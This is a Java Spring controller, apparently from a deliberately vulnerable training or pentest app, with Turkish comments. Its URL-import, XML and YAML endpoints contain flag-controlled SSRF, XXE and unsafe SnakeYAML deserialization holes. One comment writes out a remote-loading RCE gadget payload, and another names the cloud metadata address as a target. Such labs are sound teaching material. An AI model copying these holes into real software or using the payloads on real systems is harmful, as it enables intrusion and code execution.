package org.example.secshare.vuln.importer;

import org.example.secshare.vuln.VulnProperties;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.server.ResponseStatusException;
import org.w3c.dom.Document;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;

/**
 * VULN modulu: dis kaynaktan iceri aktarma.
 *  - POST /api/files/import      : sunucu verilen URL'i ceker (SSRF)
 *  - POST /api/files/import/xml  : XML govdesini parse eder (XXE)
 *
 * SADECE YETKILI PENTEST / EGITIM ORTAMI ICIN.
 */
@RestController
@RequestMapping("/api/files/import")
public class ImportController {

    private static final int MAX_BYTES = 1024 * 1024; // 1 MB

    private final VulnProperties vuln;

    public ImportController(VulnProperties vuln) {
        this.vuln = vuln;
    }

    public record ImportRequest(String url) {}

    /**
     * SSRF: bayrak acikken sunucu, verilen URL'e dogrudan istek atar; ic ag /
     * cloud metadata (169.254.169.254) gibi hedefler cekilebilir.
     */
    @PostMapping
    public ResponseEntity<String> importUrl(@RequestBody ImportRequest request) {
        String url = request.url();
        if (url == null || url.isBlank()) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "url gerekli");
        }

        boolean ssrf = vuln.isEnabled() && vuln.getImport().isSsrf();
        if (!ssrf) {
            // Guvenli: yalnizca http(s) + ozel/loopback olmayan hedeflere izin
            validateUrlOrThrow(url);
        }

        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            try (InputStream in = conn.getInputStream()) {
                byte[] data = in.readNBytes(MAX_BYTES);
                return ResponseEntity.ok()
                        .contentType(MediaType.TEXT_PLAIN)
                        .body(new String(data, StandardCharsets.UTF_8));
            }
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.BAD_GATEWAY, "Kaynak cekilemedi: " + e.getMessage());
        }
    }

    /**
     * XXE: bayrak acikken DTD/external entity acik parse edilir;
     * &xxe; ile yerel dosya okunabilir.
     */
    @PostMapping(value = "/xml", consumes = MediaType.APPLICATION_XML_VALUE)
    public ResponseEntity<String> importXml(@RequestBody String xml) {
        boolean xxe = vuln.isEnabled() && vuln.getImport().isXxe();
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            if (xxe) {
                // VULN: external entity / DTD acik birakildi
                dbf.setExpandEntityReferences(true);
            } else {
                // Guvenli: XXE korumasi
                dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
                dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
                dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
                dbf.setExpandEntityReferences(false);
            }
            DocumentBuilder builder = dbf.newDocumentBuilder();
            Document doc = builder.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
            String text = doc.getDocumentElement().getTextContent();
            return ResponseEntity.ok().contentType(MediaType.TEXT_PLAIN).body(text);
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "XML parse hatasi: " + e.getMessage());
        }
    }

    /**
     * SnakeYAML unsafe load (CVE-2022-1471 sinifi deserialization).
     *  - vuln.import.yaml=true  -> new Yaml().load() ile herhangi bir Java tipi
     *    ornegi olusturulur; "!!" etiketli gadget'larla RCE'ye kadar gidilebilir.
     *    ornek gadget: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://internal:80/"]]]]
     *  - false -> SafeConstructor: yalnizca standart tipler, keyfi sinif reddedilir.
     */
    @PostMapping("/yaml")
    public ResponseEntity<String> importYaml(@RequestBody String body) {
        boolean unsafe = vuln.isEnabled() && vuln.getImport().isYaml();
        try {
            Yaml yaml = unsafe
                    ? new Yaml() // VULN: guvensiz varsayilan Constructor
                    : new Yaml(new SafeConstructor(new LoaderOptions()));
            Object result = yaml.load(body);
            String type = (result == null) ? "null" : result.getClass().getName();
            return ResponseEntity.ok()
                    .contentType(MediaType.TEXT_PLAIN)
                    .body("loaded type=" + type + " value=" + result);
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "YAML parse hatasi: " + e.getMessage());
        }
    }

    private void validateUrlOrThrow(String url) {
        try {
            URL parsed = URI.create(url).toURL();
            String protocol = parsed.getProtocol();
            if (!"http".equals(protocol) && !"https".equals(protocol)) {
                throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Sadece http(s)");
            }
            InetAddress addr = InetAddress.getByName(parsed.getHost());
            if (addr.isLoopbackAddress() || addr.isSiteLocalAddress()
                    || addr.isLinkLocalAddress() || addr.isAnyLocalAddress()) {
                throw new ResponseStatusException(HttpStatus.FORBIDDEN, "Ozel/ic adres engellendi");
            }
        } catch (ResponseStatusException e) {
            throw e;
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Gecersiz url");
        }
    }
}
